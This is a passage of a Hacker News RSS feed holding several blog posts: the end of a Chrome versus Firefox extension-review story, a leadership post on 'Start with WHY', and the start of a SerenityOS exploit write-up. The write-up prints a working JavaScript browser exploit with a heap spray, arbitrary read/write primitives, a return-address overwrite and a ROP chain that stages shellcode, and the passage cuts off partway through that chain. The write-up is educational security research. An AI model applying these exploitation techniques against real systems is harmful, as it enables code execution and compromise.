                <li>We should "Request access to the narrowest permissions necessary"</li>
                <li>"If more than one permission could be used to implement a feature, you must request those with the least access to data or functionality."</li>
                <li>We shouldn't attempt to "future proof"</li>
              </ul>
            </div>
          </div>

          <div>
            
            <div>
              <div><p>
                We double check the permissions we've requested and can't find any problems. We respond asking for more detail.
                </p><p>
                We also mention that we had previously submitted the <i>same</i> extension with the <i>same</i> requested permissions, just under a different name (Otto). We hoped they'd say "oh, in that case we'll approve this right away!". But instead:
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                Otto, our <i>existing extension</i>, is removed from the store and no additional detail on the rejection is provided. In fact, this email contains the <i>same exact</i> text as the previous one.
              </p>
          </div>

          <div>
            
            <p>
                We respond, again asking for more detail. We ask if it would help if we expanded on how we're using each permission in the permissions justification section.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the <i>exact same text again</i>. No further detail. No help at all.
              </p>
          </div>

          <div>
            
            <p>
                We suspect these reviews are entirely automated, so we ask if we can speak to a "human reviewer", hoping this will trigger a manual review (we also consider dropping an f-bomb for the same reason, but decide to remain decent for now).
              </p>
          </div>

          <div>
            
            <p>
                They respond with some <i>slightly</i> different text, but still nothing useful.
              </p>
          </div>

          <div>
            
            <p>
                We try adding a lot more detail to the "justification" section for each of the permissions we use and we resubmit.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the exact same text as the first rejection.
              </p>
          </div>

          <div>
            
            <p>
                We respond with one more plea for more more information.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the same text again.
              </p>
          </div>
        </section>

        <section>
          

          <p>
            At this point I dig into Chrome's documentation once again with a fine-tooth comb and I make a discovery: we had been requesting both the <span>tabs</span> and <span>activeTab</span> permissions, but since we also requested permission to run on <span>&lt;all_urls&gt;</span> it turns out that the features made available by <span>activeTab</span> were a strict subset of the features made available by <span>tabs</span>. So the <span>activeTab</span> permission was redundant. We weren't opening up any new functionality, we were just asking for a <i>redundant</i> permission.
          </p>

          <p>
            This discovery made the Chrome review team's communications far more frustrating in retrospect. The line that all of their emails repeated was "Request access to the narrowest permissions necessary". And, sure, we had asked for <span>activeTab</span> when we didn't need it, but that permission <i>didn't grant us any more functionality</i>. They had rejected our extension 6 times with no detail <i>because of a technicality</i>.
          </p>

          <p>
            We committed the 1 line diff removing the <span>activeTab</span> permission and resubmitted. A day later it was accepted.
          </p>
        </section>

        <section>
          

          <p>
            A Firefox version of our browser extension had long been on our list, but for the first little while it didn't feel worth the additional support cost. We didn't know exactly how large that cost would be, but we suspected that there would be enough differences between the two browsers that it'd be a bit of a hassle to maintain them both.
          </p>

          <p>
            Boy were we wrong. When we finally started looking into porting our extension to Firefox we found that we had to make <i>zero</i> changes to the code. None whatsoever. Firefox even supported the use of the global <span>chrome</span> object for accessing extension APIs (if you're curious, Chrome is not kind enough to return the favor).
          </p>

          <p>
            So we created a Firefox developer account, submitted our extension, and girded ourselves for another rough ride.
          </p>

          <p>
            <i>Boy were we wrong.</i>
          </p>

          <div>
            
            <p>
                We submit the first version of our extension to Firefox.
              </p>
          </div>

          <div>
            
            <div>
              <div><p>
                Less than 3 hours later we receive an email from Firefox that says, in effect, "Sorry this is taking so long, but we'll get to it soon!"
                </p><p>
                Responses from the Chrome team usually came in the wee hours of the morning, making the effective turnaround about 24 hours. Firefox apologizing after fewer than 3 hours was <i>hilarious</i> to us.
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                We get an email saying the extension was accepted exactly 24 hours after submission.
              </p>
          </div>

          <p>
            Further updates have been even speedier, usually only taking 2 or 3 minutes to be scanned and accepted. One of our updates even got accepted before I finished uploading the unminified source archive (which they require if you minify in production). And the dashboard shows your position in the review queue to give you some idea of when it'll complete.
          </p>

          <p>
            Needless to say, this was a breath of fresh air, and we won't be neglecting support for Firefox ever again in the future.
          </p>
        </section>

        <section>
          

          <p>
            I realize that in some ways this is an unfair comparison. Chrome's market share is much larger than Firefox's these days, so surely they also have to deal with far more extension submissions.
          </p>

          <p>
            But the lack of transparency in their process was infuriating and counter-productive. Had someone taken the time to manually review our case, or at least <i>read any of the emails</i> we sent, we could've resolved this issue with one response. Instead it took 6 responses and a week of wondering if this review process would kill our product before it even launched.
          </p>

          <p>
            I really hope things improve, but I'm not counting on it.
          </p>

        </section>

        <hr>

        
      </div>
    </div></div>]]>
            </description>
            <link>https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116105</guid>
            <pubDate>Fri, 12 Feb 2021 17:27:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ghost in the MP3 (2014)]]>
            </title>
            <description>
<![CDATA[
Score 98 | Comments 59 (<a href="https://news.ycombinator.com/item?id=26116062">thread link</a>) | @Tomte
<br/>
February 12, 2021 | http://theghostinthemp3.com/theghostinthemp3.html | <a href="https://web.archive.org/web/*/http://theghostinthemp3.com/theghostinthemp3.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://theghostinthemp3.com/theghostinthemp3.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116062</guid>
            <pubDate>Fri, 12 Feb 2021 17:24:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Start with WHY - A simple framework for great leadership]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26115424">thread link</a>) | @fmfamaral
<br/>
February 12, 2021 | https://www.fernandoamaral.org/start-with-why/ | <a href="https://web.archive.org/web/*/https://www.fernandoamaral.org/start-with-why/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            
            <section>
                <div>
                    <figure><img src="https://www.fernandoamaral.org/content/images/2021/01/startwithwhy-1.png" alt="" srcset="https://www.fernandoamaral.org/content/images/size/w600/2021/01/startwithwhy-1.png 600w, https://www.fernandoamaral.org/content/images/2021/01/startwithwhy-1.png 700w"></figure><p><a href="https://simonsinek.com/">Simon Sinek</a> - the author of <em>'<a href="https://simonsinek.com/product/start-with-why/">Start With Why; How Great Leaders Inspire Everyone to Take Action</a>'</em> - identified a pattern in the thoughts, actions, and communication of great leaders like Steve Jobs, Martin Luther King, or the Wright brothers.</p><p>According to Simon, great leaders share a process that is the exact opposite of what the large majority of average, unremarkable leaders do.</p><p>Holding a position of power or authority can define you as a leader, but those who truly lead are the ones who inspire us. <em>"We follow them, not because we have to, but because we want to."</em></p><p>Perhaps you have your sights on developing incredible leadership skills and galvanizing others. Or maybe you want to feel more inspired at work. Either way, learning to start with WHY can be extremely valuable.</p><h3 id="the-golden-circle">The Golden Circle</h3><p>Simon created The Golden Circle, a simple framework that consists of 3 concentric layers: WHAT, HOW, and WHY.</p><figure><img src="https://www.fernandoamaral.org/content/images/2021/01/goldencircle.jpg" alt="" srcset="https://www.fernandoamaral.org/content/images/size/w600/2021/01/goldencircle.jpg 600w, https://www.fernandoamaral.org/content/images/size/w1000/2021/01/goldencircle.jpg 1000w, https://www.fernandoamaral.org/content/images/2021/01/goldencircle.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@picoftasty?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Mae Mu</a> on <a href="https://unsplash.com/photos/s6S8IgEN6-4?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure><p><strong>WHAT</strong> - Every leader can articulate what they, and their company, do. Since it's so straightforward, that is where they usually start.</p><p><strong>HOW</strong> - Most leaders also explain how they do what they do. Their unique value proposition, differentiators, and values.</p><p><strong>WHY</strong> - Few leaders make an effort to communicate why they do what they do: What's their purpose? Why does the organization exist? And why should anyone care?</p><p>The real breakthrough is the direction in which to move in the Golden Circle. You have probably guessed it by now. &nbsp;<strong>You're supposed to start with the WHY and move outwards, to the HOW, and finally the WHAT.</strong></p><p>As Simon points out, Martin Luther King gave the <em>"I have a dream"</em> speech, not the <em>"I have a plan"</em> speech.</p><h3 id="start-with-why-within-your-team">Start with WHY within your team</h3><p>When you lead a team, your success depends on the team's ability to accomplish its mission. Creating the conditions for them to succeed should be your number one priority.</p><p>Some leaders might argue that telling people what to do is the shorter, more efficient path to success. They may think that teaching the team how to do their tasks is all that's left to do.</p><p>Well, that might be good enough when dealing with workers doing repetitive, pre-defined chores. However, it is certainly not the best way to manage a high-performing team when problem-solving and creativity are ingredients of their daily tasks.</p><p>Starting with WHY, and reminding it constantly, keeps everyone aligned on the purpose of the team. That will energize and empower each individual to be pro-active, make the right decisions, surpass roadblocks, and the team will move faster as a consequence.</p><p>Teams that start with WHY are also more likely to have a strong sense of purpose and experience less churn.</p><p>People who make a habit of applying this framework can inspire others and be inspired themselves. It applies in both directions. When in doubt, don't be afraid to ask WHY.</p><h3 id="start-with-why-in-marketing">Start with WHY in Marketing</h3><p><em>"People don't buy what you do. They buy why you do it."</em> - Simon repeats this so many times, it can get on your nerves.</p><p>He also claims that <em>"the goal is not to do business with people who need what you have, the goal is to do business with people who believe in what you believe."</em></p><p>Many authors reference Apple again and again to illustrate this point. Let's allow it one more time.</p><figure><img src="https://www.fernandoamaral.org/content/images/2021/01/thinkdifferent.jpg" alt="" srcset="https://www.fernandoamaral.org/content/images/size/w600/2021/01/thinkdifferent.jpg 600w, https://www.fernandoamaral.org/content/images/size/w1000/2021/01/thinkdifferent.jpg 1000w, https://www.fernandoamaral.org/content/images/2021/01/thinkdifferent.jpg 1100w" sizes="(min-width: 720px) 720px"></figure><p>Focusing on the WHAT and the HOW, Apple would sell computers like this:</p><blockquote><em>"We make great computers. They're user friendly, beautifully designed, and easy to use. Want to buy one?"</em></blockquote><p>Starting with WHY and then moving to HOW and WHAT, they would end up with something more along these lines:</p><blockquote><em>"With everything we do, we aim to challenge the status quo. We aim to think differently. Our products are user-friendly, beautifully designed, and easy to use. We just happen to make great computers. Want to buy one?"</em></blockquote><p>In this case, a decision is made emotionally first and then justified rationally. That's why Apple <em>fanboys</em> are often accused of buying inferior products at inflated prices, as long as they come from Cupertino. Whether that is true or an exaggeration, any brand would love to have such a dedicated following.</p><p>Simon states that this behavior is grounded in biology and the way our brain makes decisions. The outer circle (WHAT) corresponds to the neocortex, where rational thoughts and language are processed. The inner circles (HOW and WHY) relate to the limbic system, where our emotions take control.</p><p>A gut feeling, that kind of decision that we need to follow but have trouble explaining rationally, comes straight from the inner circles. If your marketing can tap into the emotions of your audience, amazing things can happen.</p><p>Remember: People don't buy what you do. They buy why you do it.</p><h3 id="start-with-the-ted-talk">Start with the TED Talk</h3><p>If you've made it this far, I recommend watching Simon himself presenting his ideas. The TED Talk amassed more than 50 million views and is well worth 18 minutes of your time.</p><figure><a href="https://www.ted.com/talks/simon_sinek_how_great_leaders_inspire_action"><div><p>How great leaders inspire action</p><p>Simon Sinek has a simple but powerful model for inspirational leadership -- starting with a golden circle and the question: “Why?” His examples include Apple, Martin Luther King Jr. and the Wright brothers ...</p><p><img src="https://pa.tedcdn.com/apple-touch-icon.png"><span>TED Talks</span></p></div><p><img src="https://pi.tedcdn.com/r/pe.tedcdn.com/images/ted/04916ee6e81065c8333e6546184af512eee37bbe_2880x1620.jpg?c=1050%2C550&amp;w=1050"></p></a></figure><p>At this point, you'll probably be considering whether to read the book or not.</p><p>Although I strongly identify with the notion of starting with WHY and I've applied it many times in my life since I've discovered it, I have to say that 256 pages around this simple concept are a stretch.</p><p>The book reiterates the same message ad nauseam, and I found myself repeating <em>"Ok... I got it, start with WHY!" in my head, </em>halfway through it.</p><figure><a href="https://simonsinek.com/product/start-with-why/"><div><p>Start With Why | Simon Sinek</p><p>In 2009, Simon Sinek started a movement to help people become more inspired at work, and in turn inspire their colleagues and customers. Since then, millions have been touched by the power of his…</p><p><img src="https://simonsinek.com/wp-content/uploads/2018/08/cropped-SWW_favicon-192x192.png"><span>Simon Sinek</span></p></div><p><img src="https://simonsinek.com/wp-content/uploads/2018/09/SWW-Cover-High-Res.jpg"></p></a></figure><p>My advice is to skip the book, but I'm sure your limbic brain has already made its decision. 🧠</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to Fernando Amaral</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.fernandoamaral.org/start-with-why/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26115424</guid>
            <pubDate>Fri, 12 Feb 2021 16:35:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SerenityOS: Writing a Full Chain Exploit]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26115141">thread link</a>) | @ingve
<br/>
February 12, 2021 | https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html | <a href="https://web.archive.org/web/*/https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
    <section id="main_content">
      <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p>I recently came across <a href="https://github.com/SerenityOS/serenity">SerenityOS</a> when it was featured in hxp CTF and then on <a href="https://twitter.com/liveoverflow">LiveOverflow’s</a> YouTube channel. SerenityOS is an open source operating system written from scratch by <a href="https://twitter.com/awesomekling">Andreas Kling</a> and now has a strong and active community behind it. If you’d like to learn a bit more about it then the recent <a href="https://cppcast.com/serenity-os/">CppCast episode</a> is a good place to start, as well as all of the <a href="https://www.youtube.com/andreaskling">fantastic videos by Andreas Kling</a>.</p>

<p>Two of the recent videos were about writing exploits for a <a href="https://www.youtube.com/watch?v=LMvjaoBLPxA">typed array bug in javascript</a>, and a <a href="https://www.youtube.com/watch?v=gt6-TC6FtMs">kernel bug in munmap</a>. The videos were great to watch and got me thinking that it would be fun to try and find a couple of bugs that could be chained together to create a full chain exploit such as exploiting a browser bug to exploit a kernel bug to get root access.</p>

<h3 id="entrypoint">Entrypoint</h3>

<p>I started looking around and discovered an integer overflow when creating a typed array from an array buffer, the length was multiplied by the element size which could overflow.
<a href="https://github.com/SerenityOS/serenity/blob/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b/Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69">Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69</a></p>

<div><div><pre><code><span>static</span> <span>void</span> <span>initialize_typed_array_from_array_buffer</span><span>(</span><span>GlobalObject</span><span>&amp;</span> <span>global_object</span><span>,</span> <span>TypedArrayBase</span><span>&amp;</span> <span>typed_array</span><span>,</span> <span>ArrayBuffer</span><span>&amp;</span> <span>array_buffer</span><span>,</span> <span>Value</span> <span>byte_offset</span><span>,</span> <span>Value</span> <span>length</span><span>)</span>
<span>{</span>
    <span>// SNIP ...</span>

    <span>auto</span> <span>buffer_byte_length</span> <span>=</span> <span>array_buffer</span><span>.</span><span>byte_length</span><span>();</span>
    <span>size_t</span> <span>new_byte_length</span><span>;</span>
    <span>if</span> <span>(</span><span>length</span><span>.</span><span>is_undefined</span><span>())</span> <span>{</span>
        <span>if</span> <span>(</span><span>buffer_byte_length</span> <span>%</span> <span>element_size</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayInvalidBufferLength</span><span>,</span> <span>typed_array</span><span>.</span><span>class_name</span><span>(),</span> <span>element_size</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span><span>offset</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffset</span><span>,</span> <span>offset</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>new_byte_length</span> <span>=</span> <span>buffer_byte_length</span> <span>-</span> <span>offset</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>new_byte_length</span> <span>=</span> <span>new_length</span> <span>*</span> <span>element_size</span><span>;</span>
        <span>if</span> <span>(</span><span>offset</span> <span>+</span> <span>new_byte_length</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffsetOrLength</span><span>,</span> <span>offset</span><span>,</span> <span>offset</span> <span>+</span> <span>new_byte_length</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
    <span>}</span>
    <span>typed_array</span><span>.</span><span>set_viewed_array_buffer</span><span>(</span><span>&amp;</span><span>array_buffer</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_length</span><span>(</span><span>new_byte_length</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_offset</span><span>(</span><span>offset</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_array_length</span><span>(</span><span>new_byte_length</span> <span>/</span> <span>element_size</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This could be used to create two powerful primitives, one that could read an arbitrary address and the other that could read an arbitrary amount from some allocated memory. These were the same primitives that Kling created in his video which meant that the issue could be exploited in exactly the same way:</p>

<ul>
  <li>Finding a vtable pointer with the offset primitive by spraying lots of Numbers</li>
  <li>Use the deterministic memory layout to calculating the stack location</li>
  <li>Find the saved return address on the stack</li>
  <li>Overwriting it with a rop chain.</li>
</ul>

<p>While I was looking into exploiting this, someone else spotted the same issue and it was quickly patched.</p>

<p><a href="https://github.com/SerenityOS/serenity/commit/f6c6047e49f1517778f5565681fb64750b14bf60"><img src="https://devcraft.io/assets/serenity/slack.jpg" alt="slack"></a></p>

<p>As I had already started and wanted to keep using the same issue, I kept working from <a href="https://github.com/SerenityOS/serenity/commit/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b">this commit</a> which still had the bug :)</p>

<p>Exploiting the issue is pretty much identical to the video above and it does a great job explaining what is going on, so I wont go into too much detail. Here Is what I ended up with:</p>

<div><div><pre><code><span>&lt;script&gt;</span>
  <span>function</span> <span>log</span><span>(</span><span>msg</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>msg</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>starting hax</span><span>"</span><span>);</span>

  <span>const</span> <span>AAAs</span> <span>=</span> <span>2261634.509804</span><span>;</span>
  <span>const</span> <span>spray_size</span> <span>=</span> <span>2000</span><span>;</span>
  <span>const</span> <span>spray</span> <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>spray_size</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>// Create an array with a null backing store allowing arbitary rw</span>
  <span>ab1</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>();</span>
  <span>ua1</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab1</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>// Create an array with a large length but a valid backing store</span>
  <span>ab2</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>(</span><span>0x50000</span><span>);</span>
  <span>ua2</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab2</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>done spraying</span><span>"</span><span>);</span>

  <span>function</span> <span>read</span><span>(</span><span>addr</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write</span><span>(</span><span>addr</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>// 0x6c000 is the offset from the array buffer to the next heap allocation</span>
  <span>function</span> <span>read_heap</span><span>(</span><span>off</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write_heap</span><span>(</span><span>off</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>let</span> <span>number_i</span> <span>=</span> <span>0</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>looking for 0x41414141</span><span>"</span><span>);</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>100</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read_heap</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>0x41414141</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read_heap</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>(</span><span>16</span><span>));</span>
      <span>number_i</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> <span>number_i_vtable</span> <span>=</span> <span>number_i</span> <span>-</span> <span>8</span><span>;</span>

  <span>const</span> <span>libjs_data_addr</span> <span>=</span> <span>read_heap</span><span>(</span><span>number_i_vtable</span><span>)</span> <span>-</span> <span>0x28ac</span><span>;</span>
  <span>const</span> <span>libjs_addr</span> <span>=</span> <span>libjs_data_addr</span> <span>-</span> <span>0xe0000</span><span>;</span>
  <span>const</span> <span>stack_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x2537000</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>libjs_data_addr 0x</span><span>"</span> <span>+</span> <span>libjs_data_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>libjs_addr 0x</span><span>"</span> <span>+</span> <span>libjs_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>stack_addr 0x</span><span>"</span> <span>+</span> <span>stack_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

  <span>log</span><span>(</span><span>"</span><span>looking for stack return</span><span>"</span><span>);</span>
  <span>let</span> <span>stack_ret</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>stack_addr</span> <span>+</span> <span>0x400000</span> <span>-</span> <span>4</span><span>;</span> <span>i</span> <span>&gt;</span> <span>stack_addr</span><span>;</span> <span>i</span> <span>-=</span> <span>4</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>libjs_addr</span> <span>+</span> <span>0x5af5e</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found stack_ret 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>());</span>
      <span>stack_ret</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>0x12345678</span><span>);</span>
<span>&lt;/script&gt;</span>
</code></pre></div></div>

<p>Loading the above in the browser resulting in a crash at <code>0x12345678</code>:</p>

<div><div><pre><code>[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: Unrecoverable page fault, instruction fetch / read from address V0x12345678
[Browser(37:37)]: CRASH: CPU #0 Page Fault. Ring 3.
[Browser(37:37)]: exception code: 0014 (isr: 0000
[Browser(37:37)]:   pc=001b:12345678 flags=0246
[Browser(37:37)]:  stk=0023:026ff2e4
[Browser(37:37)]:   ds=0023 es=0023 fs=0023 gs=002b
[Browser(37:37)]: eax=026ff3c0 ebx=0491ce8c ecx=00000000 edx=0491e4a0
[Browser(37:37)]: ebp=026ff378 esp=c2a48fe8 esi=00000005 edi=02d0dfd8
[Browser(37:37)]: cr0=80010013 cr2=12345678 cr3=07351000 cr4=003006e4
[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: 0x12345678  (?)
</code></pre></div></div>

<p>Since we can write any amount to the stack, it was fairly straight forward to build a rop chain that mmapped a region, put some shellcode there, mprotected it to make it executable, then jump there:</p>

<div><div><pre><code><span>const</span> <span>libc_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x122000</span><span>;</span>
<span>const</span> <span>mmap_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b379</span><span>;</span>
<span>const</span> <span>memcpy_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x002f51d</span><span>;</span>
<span>const</span> <span>mprotect_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b487</span><span>;</span>

<span>const</span> <span>shellcode</span> <span>=</span> <span>[</span><span>0xcccccccc</span><span>];</span>

<span>// write our shellcode to a know location (start of the stack)</span>
<span>const</span> <span>shellcode_addr</span> <span>=</span> <span>stack_addr</span><span>;</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>shellcode</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>shellcode_addr</span> <span>+</span> <span>i</span> <span>*</span> <span>4</span><span>,</span> <span>shellcode</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>log</span><span>(</span><span>"</span><span>shellcode_addr: 0x</span><span>"</span> <span>+</span> <span>shellcode_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// rop gadgets</span>
<span>// 0x000462f3: pop esi; pop edi; pop ebp; ret;</span>
<span>// 0x0007bda9: add esp, 0x10; pop esi; pop edi; pop ebp; ret;</span>

<span>pop7_addr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x0007bda9</span><span>;</span>
<span>pop3_adr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x000462f3</span><span>;</span>

<span>log</span><span>(</span><span>"</span><span>pop7_addr: 0x</span><span>"</span> <span>+</span> <span>pop7_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
<span>log</span><span>(</span><span>"</span><span>pop3_adr: 0x</span><span>"</span> <span>+</span> <span>pop3_adr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// 1. map region at 0x9d000000</span>
<span>// 2. memcpy our shellcode there</span>
<span>// 3. make it executable</span>
<span>// 4. jump there</span>
<span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>mmap_addr</span><span>);</span>
<span>const</span> <span>rop</span> <span>=</span> <span>[</span>
  <span>pop7_addr</span><span>,</span> <span>//ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>3</span><span>,</span>
  <span>0x32</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0xdeadbeef</span><span>,</span>

  <span>memcpy_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>shellcode_addr</span><span>,</span>
  <span>0x8000</span><span>,</span>

  <span>mprotect_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>5</span><span>,</span>

  <span>0x9d000000</span><span>,</span>
<span>];</span>
